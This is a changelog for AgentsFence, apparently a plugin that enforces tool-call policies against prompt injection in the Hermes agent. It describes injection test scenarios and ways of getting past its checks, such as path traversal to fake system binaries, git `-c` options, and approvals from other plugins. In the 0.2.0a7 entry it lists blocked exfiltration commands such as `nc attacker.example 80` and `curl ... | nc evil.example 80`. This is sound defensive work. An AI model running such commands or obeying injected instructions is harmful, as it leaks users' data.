# Changelog

## 0.2.0a9 (alpha) — 2026-09-29

- Compile requests into explicit intents with instruction spans and individual recipient/destination bindings. Interpretations appear in status, approval/block messages and audit records. The compiler model's reading remains the trust boundary; structural validation cannot verify meaning.
- Compile every owner turn in the background behind a revision barrier. All tool calls wait for the latest revision; stale results cannot restore authority. Failed amendments suspend consequential permissions until a successful update, while preserving counters and prohibitions.
- Add `agentsfence test --compiler-eval` with an 80-case regression corpus, live route evaluation, latency and first-tool wait metrics, offline recorded outputs, and doctor evidence. Only malformed output retries once; omitted authority follows normal approval/blocking.
- Owner messages stay queued until a successful compile interprets them, so a superseded or failed update can no longer skip a revocation such as "leave everything untouched from now on". If the queue exceeds the compiler input limit, consequential permissions stay suspended and the user is told to start a new task.
- A write constrained to specific paths now asks when the call names no path, for every consequential class (previously only local writes and deletes), so remote writers and commands can't bypass their path bound by omitting it.
- The deterministic prohibition and negation checks are documented as English-only; other languages rely on the compiler model's reading.

- Prevent same-turn grants with enclosing or overlapping spans from undoing narrowing; preserve existing destination dimensions and call counters. Restore ordinary English destination wording such as "delete photos in ~/Pictures/dupes" while rejecting read/source context.
- Clarify that compiler proposals must include named delivery-service domains alongside recipients and paths, after a Nemotron regression exposed an omitted service endpoint.
- Serialize compilation-status updates from owner hooks and background workers so the runtime record neither loses active sessions nor races on its temporary file.
- Enforce recognized English only-target narrowing against existing permissions even when a model omits the change operation, and recognize "leave everything untouched" as a prohibition. The floor never creates an omitted grant. Advertise inferred remote writers by exact tool name when their risk differs from the generic capability, preventing LOCAL_WRITE proposals for EXTERNAL_WRITE tools.
- Document persisted unresolved owner instructions, their cleanup after successful compilation, and separate policy/audit retention.

## 0.2.0a8 (alpha) — 2026-09-28

- **Close post-check argument rewrites:** protected profiles block tool calls while another pre-tool hook or tool execution middleware is registered, including benign callbacks. Native regressions cover both hook orders and middleware through mock dispatch; request middleware remains supported. Doctor and install verification report compatibility errors.
- **Real-model compiler grant consistency:** the compiler prompt and bounded retry explain that communication grants also require `allow_external_writes`, with exact user evidence and recipient bounds. This fixes unnecessary approval prompts for explicitly authorized email; hardening still only removes authority. Invalid provider responses are reported separately from invalid policy JSON.

Onboarding rebuilt around how Hermes works: AgentsFence is installed once through Hermes' package manager, and protection is per profile. From an early user's 15-point report on 0.2.0a7.

**Upgrading from 0.2.x:** run `uvx --from 'agentsfence==0.2.0a8' agentsfence install`. It re-applies AgentsFence to every profile that has it, migrates retired settings (offline rules become the profile's default model) and says what it changed. `setup`, `doctor` and `audit` keep working; `demo`, `selftest`, `compile` and `check` are gone (`agentsfence test` replaces the first two).

- **Accepted PM onboarding contract:** with no protected profiles, `install` registers disabled surfaces without building; first `protect` installs the dependency. Protect/upgrade publishes guarded files before PM build and verification; failures restore files and rebuild prior declarations, with recovery evidence retained if rollback is incomplete. Temporary tool blocking is possible during the switch. Persistent machine-only dependency installation and build-before-activation staging are deferred beyond 0.2.0a8.
- **Five steps, each its own command.** `install` checks that Hermes can run AgentsFence and registers it (and upgrades protected profiles); `protect` / `unprotect` take `--profile`, `--profiles` or `--all-profiles`; `settings` shows or changes the compiler and monitoring; `test` runs the scenarios in a profile; `doctor` and `audit` are unchanged in purpose. `setup` is a wizard over them: without a terminal it protects every profile with defaults instead of exiting 2, and names each profile's compiler once. The website's install command now protects every profile, not only `default`.
- **Supported Hermes: builds with `hermes pm`** (`hermes --version` shows `0.21.5+…`; stable 0.21.5 users get it with `hermes update`). A Hermes without it is told to update and nothing is written. Removed: the venv/`uv pip` install path, `pre_tool_call` hook reordering and `evaluation.plugin_conflicts` (Hermes resolves block > approve for every plugin), explicit-model routing and 0.19/0.20 API shims.
- **Capability preflight before any change.** `install`, `protect`, `settings` and `doctor` check in Hermes' own interpreter that it provides every capability AgentsFence relies on: the plugin hooks, block precedence (Hermes' own directive resolution, given an earlier approve and a later block, returns block), the approval APIs, the hook timeout, compiler routing by task, the plugin API, and plugin `python_dependencies` in the package manager. `hermes pm` alone does not establish compatibility.
- **Journaled install, upgrade and protect.** Every change is a journaled transaction: snapshot the files AgentsFence may touch, apply, run `hermes pm install`, verify that a new Hermes process loads this version and enforces, then commit. A failure at any step restores the snapshot; if the build had already switched Hermes' environment, it is rebuilt from the restored pins. A crash leaves the journal and the next AgentsFence command finishes the rollback. Protected profiles keep the version that protected them, or block every tool call with the repair; never unprotected. Tested with injected failures at every step.
- **Compiler: the profile's default model, or a dedicated one.** Offline rules are no longer a compiler choice. Hermes resolves an empty compiler route to each chat's live model (including `-m`), so AgentsFence keeps its compiler slot on the profile's default and moves it when you change the default (`hermes model`): on protect, doctor, every command and before each compile. `agentsfence settings --model MODEL` selects a dedicated model. Plugin-model override grants written by earlier versions are removed.
- **One set of settings.** Settings every profile shares live in `<Hermes root>/agentsfence/settings.yaml`; `agentsfence settings --profile NAME` writes an override. The compile budget is one value, and protect/settings raise every protected profile's `plugins.hook_callback_timeout` to match (never lowering a larger one).
- **Protect new profiles automatically** (`protect --include-new` or the Desktop switch): profiles created later are protected the next time AgentsFence runs (any command, or the Desktop pane opening). Profiles you unprotect stay unprotected. Doctor lists unprotected profiles. Hermes chat processes never run this upkeep (it can rebuild Hermes' environment).
- **One AgentsFence version per Hermes.** Only `install` (upgrade) and `uninstall` run while Hermes has another AgentsFence version; `protect`, `unprotect`, `settings` and protect-new-profiles refuse with the command for either version, so an older `agentsfence` on PATH can neither downgrade profiles nor pin loaders to a version Hermes lacks. Loaders accept only the new version once a new Hermes process demonstrably runs it. Hermes' build output goes to stderr, so `--json` output stays parseable.
- **Doctor reports enforcement and compiler health separately.** Enforcement (a new process loads current AgentsFence, and running processes run it) is the only input to PROTECTED. Compiler health (healthy, slow, failed, not verified) and Hermes capabilities are separate lines, so one slow probe no longer flips a profile to NOT PROTECTED, and "compiler not verified after upgrade" sits next to PROTECTED instead of contradicting it. Times are shown in local time with their zone.
- **`agentsfence test --profile NAME`** runs the six scenarios (injected send blocked, authorized email allowed, single send approved, …) in the profile's real Hermes process with the profile's real compiler; `--all` adds the injection probes. Every run compiles afresh in its own session. A compile that fell back is FALLBACK and fails: it never reports PASS or authorization verified. An optional live run first lets the least capable chat model the profile can reach try the scenarios against mock Gmail/Drive tools only: a free model when there is one, otherwise the cheapest after you accept its projected cost (`--yes`). What the model tried is marked in the report; injected calls it did not try are replayed so every scenario ends in a definite verdict.
- **Uninstall** (`agentsfence uninstall [--purge]`) removes AgentsFence from every profile's `config.yaml`, its loaders and settings, lets `hermes pm install` drop the package and runs `hermes pm gc` for old environments. Audit logs are kept unless `--purge`.
- **Logs:** `audit.jsonl` rotates past `audit.max_bytes` (10 MB); rotated files older than `audit.retention_days` (90) are removed. Install, protect, unprotect, settings, uninstall and rollbacks are audited in `<root>/agentsfence/audit.jsonl`. Every audit event is also one line in Hermes' `agent.log` with its session id.
- **Desktop:** per-profile Protect/Unprotect, Protect all, the protect-new-profiles switch, Settings for every protected profile, and Test (with consent before a paid live model). The live self-test views are gone.
- Invariant kept: ALLOW, BLOCK and human approval behave as before in CLI chats, gateways and the Desktop. New real-Hermes tests answer approvals through Hermes' gateway approval queue (what the Desktop uses): "once" runs exactly that call and records an exact-action grant; "deny" runs nothing.
- Removed from the repository: `WHITEPAPER.md` (the website hosts it), old validation prose (historical release evidence is retained), the upstream block-precedence proposal (landed in Hermes) and `examples/demo_tasks.md`.

- **Windows diagnostics:** reject retained metadata from an exited process before matching runtime registrations.
- **Desktop setup feedback:** scenario tests show observed stages, completed scenario counts and elapsed time. Profile rows use live enforcement evidence for the current backend.
- **Alpha validation limits:** setup and Desktop controls are verified; real-model scenario timeouts and actual native approval dialog verification remain outstanding before beta.

## 0.2.0a7 (alpha) — 2026-09-27

From an early user's three-day report on 0.2.0a3–0.2.0a6 (Hermes 0.19.0 and Hermes `main`, which `hermes --version` shows as `0.21.5+…`).

- **One install and upgrade command for every Hermes layout: `uvx --from 'agentsfence==0.2.0a7' agentsfence setup`.** Setup writes configuration first, then installs AgentsFence where Hermes runs it. When Hermes manages its own Python environment (`hermes pm`, current `main`), setup declares `agentsfence==<version>` as the plugin's Python dependency and runs `hermes pm install`; it never `uv pip install`s into that environment, which made it differ from Hermes' lock and triggered a rebuild. On venv releases (0.19.0–0.21.5) it installs with `uv pip install`. `--no-install` skips the step. Doctor, the fail-closed loader and setup now give this pinned command as the repair.
- Doctor, setup and probes never start Hermes while it has update work pending. They run Hermes' own check first (an interrupted update, a running update, or an environment Hermes would rebuild) and report it with the remedy; previously setup's own check started Hermes, which rebuilt itself while every chat failed for about two minutes.
- **A managed install stays managed, and an unverifiable update state is not "nothing pending".** `AGENTSFENCE_HERMES_PYTHON` pointing at Hermes' managed interpreter no longer turns the install into a plain venv, which sent setup's `uv pip install` into the environment `hermes pm` owns and made the next start rebuild it. The source checkout and install record come from the launcher. On a managed install, a currency check that cannot run, times out or gives no usable answer is reported as unverified: doctor, status, probes and replay do not start Hermes, and setup neither installs nor trusts the installed version. Venv installs are unchanged.
- **Doctor can list running processes when run through `uvx` or `uv tool`.** AgentsFence now declares `psutil`, which it previously got only from Hermes' environment. Without it, the running-processes check was always unverified, so doctor reported UNVERIFIED and exited 1 even on a clean machine. Hermes already pins `psutil==7.2.2`, so its managed environment resolves unchanged.
- **Hermes installed by its own installer is recognized.** A fresh install from Hermes' `scripts/install.sh` has no `<source>/venv`: `~/.local/bin/hermes` runs `<source>/.hermes/bin/hermes`. AgentsFence did not recognize it, so setup skipped the install but exited 0, and doctor started Hermes without checking for pending work, which made Hermes rebuild. AgentsFence now recognizes the same launchers Hermes treats as its own (`.hermes/bin`, `venv`, the bootstrap line), including through wrapper scripts, and only a `hermes-agent` checkout counts. A launcher whose install still cannot be identified is "update state unverified": Hermes is not started, and setup fails instead of skipping.
- Hermes' interpreter comes from Hermes' own record (`installs/<key>/facts.json`) when its package manager owns the environment, so doctor and setup no longer name the legacy `venv` interpreter. Doctor shows it and any pending update.
- A `python_dependencies` pin is declared only for a published release (Hermes' update disables a plugin whose pin cannot resolve, in every profile), and setup rewrites every profile's loader and pin to one version, because all profiles share one Hermes environment. Setup run outside Hermes asks Hermes' own Python how it routes the compiler. Setup validates every selected profile before writing any.
- **Remove automatic restoration of omitted grants.** A compile may retry once within its original total budget when a requested grant is omitted or fails hardening. Each draft passes the same checks. If authority remains uncertain, explain the missing permission and use the normal exact-action approval or blocking path.
- Follow-up messages add to a tool constraint's recipients, domains and paths, as they already did for the policy-wide lists; explicit "only … / … instead" narrowing replaces the relevant earlier scope. A follow-up "also email jane@…" no longer leaves an earlier send constraint that refuses Jane.
- **Offline rules are READ-only for beta.** Requested saves, sends and execution require exact-action approval under the default policy; destructive, financial and permission changes remain blocked by default. Explicit prohibitions and only-domain restrictions remain enforced, including when compiler input is truncated or compilation fails.
- **Enforce authorization bounds independently of restoration.** A save/copy may authorize only its destination, never its source, and cannot authorize memory/skill writes through a shared LOCAL_WRITE class or configured aliases. Explicit only-domain bounds block outside-domain reads and writes before grants. Earlier permissions remain unless a later instruction explicitly narrows them, including previously broad tool/capability grants.
- **Two shell commands that could run a program are no longer classified as reads.** A program path is trusted by its name only when it sits directly in a system bin directory with no `.` or `..` components, so `/usr/bin/../../tmp/ls` is execution, not `ls`. Git global options are skipped only when they select a repository or control paging. Every other global option is execution: `-c` in both separate and attached (`-ccore.fsmonitor=…`) forms, `--config-env`, `--exec-path`, and any option AgentsFence does not recognize.
- **Explicit only-domain bounds cover shell network programs.** Under "only use example.com", every destination of a network program a shell command runs must be verifiable and permitted before any earlier approval is considered, in every segment of a pipeline. An approval for `nc attacker.example 80` given before the narrowing no longer survives it, and neither do `curl evil.example` (no scheme), `curl https://example.com evil.example` or `curl https://example.com | nc evil.example 80`. ssh-family, mail and git remote commands, proxies, wrapped or env-prefixed network programs and shell expansions cannot be verified and block. Without an explicit bound, verdicts are unchanged. curl and wget accept only the options they document: `--expand-<option>` counts as that option, curl's rejected `--name=value` form and unknown options are unverifiable, wget's abbreviations resolve to the option they select, and a value such as `host:443:other:443` is never read as a host.
- **Write and delete limits count distinct files, not calls.** Correcting or patching the file the task already saved no longer hits `call-limit-exceeded` (which left a garbled file); a second file still does. Limits on sending, external writes, execution and payments still count every call.
- When one message both forbids and asks for something, the user is told: the chat notice says which action, that the prohibition applies, and how to allow it; the model is asked to say so before acting; an `instruction_conflict` audit event records it.
- The compile-budget warning names the setting that limits the budget, and `agentsfence setup --compile-budget SECONDS` raises both `compiler.timeout_seconds` and Hermes' `plugins.hook_callback_timeout` (raising one alone changes nothing). The timeout fallback message says the same.
- Hermes' log line for every audit event now names the session, and for compiles the model, duration and fallback; approval events record `wait_seconds`; `agentsfence audit` prints them.
- **New `agentsfence selftest replay [--quick]`:** compiles the self-test requests with the profile's real compiler inside a real Hermes process and sends the exact tool calls each injected fixture asks for through the same decision path as `pre_tool_call`. No chat model, no tool execution, a definite verdict per call in seconds. A save-and-correct control catches false blocks. The report separates **injection containment** (every injected call stopped, required for every compiler) from **authorization** (a real compiler allowed every requested call). Offline rules, READ-only by design, pass with authorization "not verified" instead of failing; `--require-authorization` makes that a failure for the beta gate. Replay sessions never count as live self-test evidence.
- **Scheduled jobs:** setup and doctor list a profile's Hermes cron jobs, which run fenced and unattended after setup; `agentsfence doctor --jobs` compiles each job's prompt and shows what it would authorize.
- The live self-test's prompts name the canary folder this machine uses; injected commands keep the website pages' literal paths.
- `demo --hermes` uses Hermes' own AgentsFence when it has this version, and never lets Hermes install extras during the demo.
- Real-Hermes tests use the interpreter Hermes' record names, set `HERMES_DISABLE_LAZY_INSTALLS`, and skip instead of letting a self-updating Hermes rebuild the developer's install for a throwaway home.

- **One first-run sequence per profile: setup, then `doctor --profile <name> --probe-compiler`, then `selftest replay --profile <name> --quick`.** Setup prints the last two for each profile it configured, pinned to this version. Doctor's compiler hint names the profile, and after a passing probe doctor prints the replay step. README and the website show the same three commands in the same order.
- **Recorded beta gate.** `scripts/beta_validate.py` runs each BETA_GATE.md environment in a throwaway workspace: a fresh install and an upgrade from 0.2.0a6 through the real setup (the managed row uses Hermes' own installer and `hermes pm install`), then doctor with a compiler probe and quick replay. It writes a redacted evidence record per environment. The automatic release refuses a beta or later version without a complete PASS record from an ancestor commit with no code changes since. `selftest replay --json` prints the full result.

The finite beta gate is in [BETA_GATE.md](BETA_GATE.md). Features are frozen while installation, real-compiler doctor/replay and authorization coverage are completed. Current patch changes have not been tested in this review.

## 0.2.0a6 (alpha) — 2026-09-27

- **Re-run setup after upgrading, with Hermes' Python: `<hermes python> -m agentsfence setup --all-profiles`.** Setup now writes a fail-closed loader: if AgentsFence is missing from Hermes' environment (for example after `hermes update` moves Hermes to a new Python environment) or cannot start, every tool call is blocked with repair steps instead of Hermes running unprotected. This holds when Hermes runs the loader; `doctor` reports a plugin Hermes skipped or disabled as "Protection off". The setup-written manifest declares `agentsfence==<version>` as a Python dependency so Hermes 0.21.5+ can reinstall it.
- `register()` registers enforcement first and records an explicit outcome; a failure in a required hook, even after partial registration, installs a blocking hook, and optional or diagnostic failures never remove enforcement.
- Doctor asks Hermes itself, through its launcher, what a new process loads (`hermes -p <profile> agentsfence status --json`), then reports three checks (new processes, running processes, compiler) and an overall PROTECTED / NOT PROTECTED / UNVERIFIED result. An unavailable process scan or an unreachable Hermes is unverified, never OK. If Hermes outlives the check (for example while finishing its own update), it is left running.
- Compiler probes and selftest preflight run through the same launcher, so they use Hermes' real runtime instead of guessing its Python; the caller's package is never injected.
- Compiler evidence records its provenance (version, compiler route, every compiler setting that can change the outcome such as the timeout, Hermes' routing mode (task, explicit model or host model), and the actual model) when the operation starts. Evidence from a different routing mode, as after a Hermes upgrade from 0.20.0 to 0.20.1, is not current. Desktop's Fallback state likewise uses only evidence recorded under the current version and settings. Evidence from another version or configuration is reported as not matching, and older rows without provenance as historical.
- Desktop shows a backend whose AgentsFence could not start as "Tools blocked · repair required", and never blocks a turn while delivering a status event.
- Repair and upgrade instructions name Hermes' own interpreter (`<python> -m agentsfence setup`), and setup warns when it ran from a different AgentsFence than the one Hermes loads, so a stale copy on PATH can no longer pin a profile's loader to the wrong version.
- CI adds Hermes `main` `50873d21549` (Python 3.14) to the required matrix and a non-blocking job on the tip of `main`.
- **"Inherit" now pins the policy compiler.** Setup's default choice, "Use this profile's current default", records the profile's default model as the compiler route, so a per-chat `-m` or mid-chat model switch no longer changes (or slows) the compiler. Doctor and Desktop show the route actually configured, the model the last compile used, and a drift warning when the profile default changes after setup. Routes written by earlier setups are labeled "follows each chat's model" until setup is re-run. A custom endpoint is pinned only in a form Hermes honors: a named provider, or an unnamed endpoint whose key is referenced by `model.key_env` (copied by name, never the key). A profile without a default model, an inline `model.api_key`, or a custom endpoint on Hermes before 0.20.1 stays unpinned, and setup says why.
- Invented call limits on reads no longer block legitimate work. A compiler-added `max_calls` on a proven read-only capability (for example `web.fetch`) is dropped unless the user explicitly restricted that specific read: a request clause (not an explanation) that opens with that capability's own action and says "once", "only once", "at most once" or "a single time" (never "more than once", "at least once", "once again" or "once a day"), and, for a site-scoped read, names a site the constraint covers, so re-reading a page to summarize it works. Limits on consequential actions, limits on capabilities shared with write-capable tools or produced by verb inference, and manual or earlier-turn limits are kept. Documentation now states the hardening rule precisely.
- The compile budget is visible: probes use the same deadline as chat compiles, report the budget and its source (Hermes' timeout, disabled, or assumed on Hermes before 0.21.0), and warn when a compile takes more than half of it. Defaults are unchanged.

## 0.2.0a5 (alpha) — 2026-09-26

- Pin install instructions to 0.2.0a5; 0.2.0a4 fails every policy compile on Hermes 0.19.0-0.20.0.
- Support Hermes 0.19.0 or newer. Hermes 0.19.0-0.20.0 register auxiliary tasks but reject `ctx.llm.complete(task=...)`, so every policy compile fell back to read-only. AgentsFence now passes `task` only where Hermes accepts it and otherwise sends the selected policy model explicitly; setup allows exactly that model for AgentsFence on those versions.
- Map compiler errors by cause: an incompatible Hermes API no longer reports "authentication failed" (the old check matched "key" inside "keyword"), and a denied model override points to setup.
- Require a restart only when a running Hermes process needs one: a chat, gateway or desktop backend for the profile that started before AgentsFence was enabled, or that runs an older AgentsFence version or startup settings. Doctor finds these by listing the user's Hermes processes and names each by PID. A profile with no Hermes process reports **Enabled**; if processes cannot be listed, doctor says so and exits non-zero instead of promising that no restart is needed. Policy model changes and unrelated Hermes settings no longer mark processes stale.
- Desktop setup recycles only the backends that need it and still checks every saved profile.
- Never signal a process to check whether it is alive: on Windows `os.kill(pid, 0)` terminates it. Runtime liveness and start-time identity now use psutil, with `ps` and `os.kill` only as a POSIX fallback, so status also works where `ps` is missing.
- Report each chat's own approval mode. Status called `is_approval_bypass_active()`, which reads whichever session is current in the calling context, so another chat's `/yolo` could show as `off` (on every Hermes version for profile-level status, and for every chat on 0.19). It now evaluates exactly the requested session, or process and config only; on Hermes 0.19, which lacks a per-session check, it composes that check from Hermes' own parts instead of reporting `unknown`.
- A malformed Hermes or AgentsFence `config.yaml` no longer breaks Desktop's profile list, status or checks, or `doctor --all-profiles`: the profile is reported as unreadable, the others still load, and it is never pre-selected or saved in Desktop setup. Setup validates every selected profile before writing any file, so a bad one can no longer leave another half-configured.
- An unreadable audit log (for example, created by Hermes running as another user) is reported in status instead of aborting doctor.
- CI adds a Windows job for runtime process handling.
- A push to main automatically tags and publishes an unpublished version after every CI job passes, using the existing PyPI trusted publisher.
- CI runs the real-Hermes integration tests against Hermes 0.19.0, 0.20.0, 0.20.1 and 0.21.5, including a host-model compile through Hermes' real plugin LLM API.

## 0.2.0a4 (alpha) — 2026-09-26

- Profile-selecting CLI onboarding and Hermes-native model routing by default.
- Desktop status chip/pane, model/profile setup, compiler probe and self-test controls.
- Doctor validates current runtime registration; audit and self-test support session/profile selection.
- Visible compiler fallbacks, prohibition origins and conflicting-instruction diagnostics.
- Self-test reports include run/session/time evidence and distinguish unobserved actions from blocks.
- Treat Hermes expanded reference footers as untrusted content; use durable chat IDs for desktop audit queries.
- Block tools during policy compilation and bound provider calls before Hermes's hook deadline; late responses cannot install policies.
- Clarify Desktop configuration editing: saved choices, profile enablement, review, cancel, bulk preservation and save/restart/validate feedback.
- Preserve the demo result stream when Hermes redirects output in piped subprocesses.
- Allow bounded concurrent compilation, preserve later-turn prohibition origins and include delegated self-test decisions.
- Preserve git-installed manifests and load each checkout's own implementation.
- Share effective approval checks, incrementally read audit logs and prune confirmed dead runtime registrations.

## 0.2.0a3 (alpha) — 2026-09-24

- Add tag-triggered, tested PyPI publication through GitHub Actions Trusted Publishing.

## 0.2.0a2 (alpha) — 2026-09-24

- Discard compiler-generated denials unless the user's own instruction supports them; this fixes false blocks of requested reads.
- Add model-facing guidance to leave prompt-injection directions out of ordinary summaries. This is best-effort output hygiene; tool-call enforcement remains the security boundary.
- Let self-test prompts target an alpha documentation host with `AGENTSFENCE_SELFTEST_SITE`.
- Make `agentsfence demo --hermes` work from a wheel install, using Hermes' entry-point discovery, and prepare a versioned public alpha wheel for friend testing.

## 0.2.0a1 (alpha) — 2026-09-24

Follow-up fixes from the self-test review:

- Action verbs used as the subject of informational sentences remain informational through coordination and "then". This closes cases such as "Explain why save and delete files differ" and "List save and delete commands." A summary can still request a concrete save path or email address in the same sentence.
- Compiled policies bind sends to exact named recipients even when the request also names their domain for browsing. Manually written policies can still opt into a recipient-wide domain grant.
- Fallback and `strict_yolo` block questions that Hermes would auto-approve through an exact allowlist entry or an unattended cron run, in addition to yolo and `approvals.mode: off`.
- Self-test reports use only run-scoped audit decisions and local canaries. Page text in session logs no longer masquerades as an outbound call; a permitted call is reported separately from a delivered result.
- The self-test kit refuses an unowned nonempty directory and cleans only its named files. The website's outbound URL canary now contains a fixed marker instead of user or session data.

Security fixes from the second 2026-09-24 review, which found gaps in the first round's fixes. Regression tests are in `tests/test_review_regressions.py` and `tests/test_hermes_integration.py`.

- AgentsFence moves its `pre_tool_call` hook first in `register()` and at every `pre_llm_call`, not only inside its own hook. Previously, a plugin that loaded earlier and approved everything won the first tool call of a process.
- Patch text is parsed with Hermes' own grammar: `*** Move File: a -> b` checks both paths, and headers with extra whitespace are recognized. Hermes' `parse_v4a_patch` is also consulted when it can be imported.
- Evidence must contain a *request*: a clause that opens with the action's verb. "Explain how to send…" and "the email from…" no longer authorize anything.
- Evidence is checked per risk class. A send request no longer authorizes other external writes (such as a CRM update) through the shared `allow_external_writes` flag.
- Tools mapped as reads that carry an `action`/`operation`/`method` argument are reads only for declared read actions. Spotify (library, devices, playback, queue, playlists) and Discord actions are mapped explicitly.
- The offline rules compiler understands "only use <domain>" and "save … to <path>".
- New `agentsfence selftest setup|check|clean|list`: a before-and-after test against harmless injection pages at agentsfence-alpha.vercel.app/test/.

Security fixes from the first 2026-09-24 review. Each finding has a regression test in `tests/test_review_regressions.py`.

- Tools whose arguments act are classified by those arguments: `browser_console(expression=…)` is code execution, and multi-file `patch` text is checked per named file (`Delete File` is a delete).
- The shell classifier is option-aware (`sort -o`, `rg --pre`, `find -fprintf`, `yq -i`, git's mutating subcommands). Env-var prefixes and non-system binaries are execution.
- Compiler hardening: evidence quotes must request the permission; recipients must be the object of a send/share request; boundary-anchored literals; broad path roots refused; compiled policies can't allow unknown tools; prohibitions are read from the full, untruncated message.
- Approvals grant exactly one action (fingerprint of command/code/recipients/paths). ASK reserves budgets. An auxiliary LLM's "smart" approval mints nothing.
- BLOCK always beats ASK. AgentsFence keeps its hook first so another plugin's `approve` can't hide its `block`; new `plugin_conflicts` option.
- Nested `execute_code` calls resolve to the parent/subagent policy; unknown task-only calls are blocked.
- Gateway: `/fence` refuses; only the task owner can widen a policy in shared chats.
- Policies survive shutdown for `--resume`; expired records are pruned.
- Fallback policy blocks rather than asks under auto-approval; a startup failure registers a block-everything hook.
- Audit log redacts nested content under kept keys and the compiler's summary.
- Other profiles' config/secrets/plugins are protected; `cross_profile` writes ask.
- `agentsfence doctor` reports other `pre_tool_call` plugins and safe mode.

## 0.1.0 — 2026-09-23

First public release.

- Hermes plugin with `pre_llm_call` policy compilation and `pre_tool_call` enforcement (`ALLOW` / `BLOCK` / `ASK_USER`).
- Policy compiler with three providers: OpenRouter (default `anthropic/claude-haiku-4.5`), the Hermes host model, and offline rules.
- Deterministic hardening: verbatim evidence, literal recipients/domains/paths, extracted prohibitions, no wildcards, read-only fallback.
- Risk classifier: explicit mappings for Hermes built-ins, verb inference for MCP tools, shell-command sub-classification.
- Guards: self-protection, secret-file access, exfiltration-shaped URLs.
- Minimal runtime grants from approvals; task-scoped approval keys; approval reconciliation via `post_tool_call`.
- Per-session policy store (0600) with subagent binding and race-free call budgets.
- Redacted JSONL audit log; `/fence` slash command; `agentsfence` CLI.
- Reproducible demo (standalone and through real Hermes dispatch) and attack test suite.
